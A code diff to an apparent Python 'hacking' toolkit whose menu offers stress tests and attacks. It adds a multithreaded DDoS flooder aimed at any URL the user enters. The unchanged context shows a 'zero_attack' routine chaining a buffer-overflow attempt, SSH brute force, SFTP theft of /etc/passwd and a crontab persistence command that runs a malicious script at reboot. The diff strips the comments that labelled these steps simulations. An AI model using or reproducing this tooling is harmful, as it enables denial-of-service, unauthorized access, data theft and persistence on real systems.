@@ -11,6 +11,10 @@ import paramiko
 import platform
 from pwn import *
 from bs4 import BeautifulSoup
+from colorama import Fore, init
+
+# Initialize colorama
+init(autoreset=True)
 
 # List of high-traffic websites for testing
 default_urls = [
@@ -74,7 +78,6 @@ async def start_flood(url, ip=None):
             tasks.append(task)
         await asyncio.gather(*tasks)
 
-
 # Network stress test
 def network_stress(ip=None, custom_urls=None):
     loop = asyncio.new_event_loop()
@@ -87,12 +90,10 @@ def network_stress(ip=None, custom_urls=None):
 
 # Simulate Zero-Day Attack (simplified without buffer overflow)
 def zero_attack(url_or_ip):
-    # Buffer overflow simulation
     print(f"Attempting buffer overflow on {url_or_ip}...")
 
     try:
-        # Example buffer overflow (if a vulnerable binary exists, replace it)
-        binary_path = './vulnerable_binary'  # Simulated vulnerable binary
+        binary_path = './vulnerable_binary'
         if not os.path.exists(binary_path):
             raise FileNotFoundError(f"{binary_path} does not exist")
 
@@ -110,7 +111,6 @@ def zero_attack(url_or_ip):
     except Exception as e:
         print(f"Buffer overflow attack failed on {url_or_ip}: {e}")
 
-    # SSH brute force attack simulation
     print(f"Attempting SSH brute force on {url_or_ip}...")
     try:
         client = paramiko.SSHClient()
@@ -128,7 +128,6 @@ def zero_attack(url_or_ip):
             print(f"SSH brute force failed on {url_or_ip}")
             return
 
-        # Data Exfiltration Simulation
         print("Attempting data exfiltration...")
         sftp = client.open_sftp()
         sensitive_files = ['/etc/passwd', '/etc/hosts']
@@ -140,7 +139,6 @@ def zero_attack(url_or_ip):
                 print(f"Failed to exfiltrate {file}: {e}")
         sftp.close()
 
-        # Persistence Mechanism
         print("Setting up persistence...")
         command = '(crontab -l 2>/dev/null; echo "@reboot python3 /tmp/malicious_script.py") | crontab -'
         stdin, stdout, stderr = client.exec_command(command)
@@ -172,10 +170,59 @@ def display_books(books):
         print(f"Link: {book}")
         print("-" * 20)
 
+# DDOS attack
+def dos(target):
+    while True:
+        try:
+            res = requests.get(target)
+            print("Request sent!")
+        except requests.exceptions.ConnectionError:
+            print("[!!!] Connection error!")
+
+def ddos_attack():
+    print(Fore.MAGENTA + """
+    DDDDDDDDDDDDD      DDDDDDDDDDDDD             OOOOOOOOO        SSSSSSSSSSSSSSS 
+    D::::::::::::DDD   D::::::::::::DDD        OO:::::::::OO    SS:::::::::::::::S
+    D:::::::::::::::DD D:::::::::::::::DD    OO:::::::::::::OO S:::::SSSSSS::::::S
+    DDD:::::DDDDD:::::DDDD:::::DDDDD:::::D  O:::::::OOO:::::::OS:::::S     SSSSSSS
+      D:::::D    D:::::D D:::::D    D:::::D O::::::O   O::::::OS:::::S            
+      D:::::D     D:::::DD:::::D     D:::::DO:::::O     O:::::OS:::::S            
+      D:::::D     D:::::DD:::::D     D:::::DO:::::O     O:::::O S::::SSSS         
+      D:::::D     D:::::DD:::::D     D:::::DO:::::O     O:::::O  SS::::::SSSSS    
+      D:::::D     D:::::DD:::::D     D:::::DO:::::O     O:::::O    SSS::::::::SS  
+      D:::::D     D:::::DD:::::D     D:::::DO:::::O     O:::::O       SSSSSS::::S 
+      D:::::D     D:::::DD:::::D     D:::::DO:::::O     O:::::O            S:::::S
+      D:::::D    D:::::D D:::::D    D:::::D O::::::O   O::::::O            S:::::S
+    DDD:::::DDDDD:::::DDDD:::::DDDDD:::::D  O:::::::OOO:::::::OSSSSSSS     S:::::S
+    D:::::::::::::::DD D:::::::::::::::DD    OO:::::::::::::OO S::::::SSSSSS:::::S
+    D::::::::::::DDD   D::::::::::::DDD        OO:::::::::OO   S:::::::::::::::SS 
+    DDDDDDDDDDDDD      DDDDDDDDDDDDD             OOOOOOOOO      SSSSSSSSSSSSSSS
+    """)
+
+    url = input("Enter URL>> ")
+    try:
+        threads = int(input("Threads: "))
+    except ValueError:
+        exit("Threads count is incorrect!")
+
+    if threads == 0:
+        exit("Threads count is incorrect!")
+
+    if not url.__contains__("http"):
+        exit("URL doesnt contain http or https!")
+
+    if not url.__contains__("."):
+        exit("Invalid domain!")
+
+    for i in range(0, threads):
+        thr = threading.Thread(target=dos, args=(url,))
+        thr.start()
+        print(str(i + 1) + " threads started!")
+
 # Main user interface
 def display_ui():
     while True:
-        print("""
+        print(Fore.GREEN + """
          ██╗░░██╗░█████╗░░█████╗░██╗░░██╗██╗███╗░░██╗░██████╗░░░░░░░███████╗
          ██║░░██║██╔══██╗██╔══██╗██║░██╔╝██║████╗░██║██╔════╝░░░░░░░╚══███╔╝
          ███████║███████║██║░░╚═╝█████═╝░██║██╔██╗██║██║░░██╗░█████╗░░░███╔╝░
@@ -193,10 +240,11 @@ def display_ui():
         [8] Stress Test a Custom URL
         [9] Web Crawling
         [10] Admin (zero attack)
-        [11] Exit
+        [11] DDOS Attack
+        [12] Exit
         """)
 
-        choice = input("Select the method (1-11): ").strip()
+        choice = input("Select the method (1-12): ").strip()
 
         if choice == "1":
             ip_address = input("Enter the IP address: ").strip()
@@ -238,6 +286,8 @@ def display_ui():
             url_or_ip = input("Enter the URL or IP address to use: ").strip()
             zero_attack(url_or_ip)
         elif choice == "11":
+            ddos_attack()
+        elif choice == "12":
             print("Exiting...")
             break
         else:
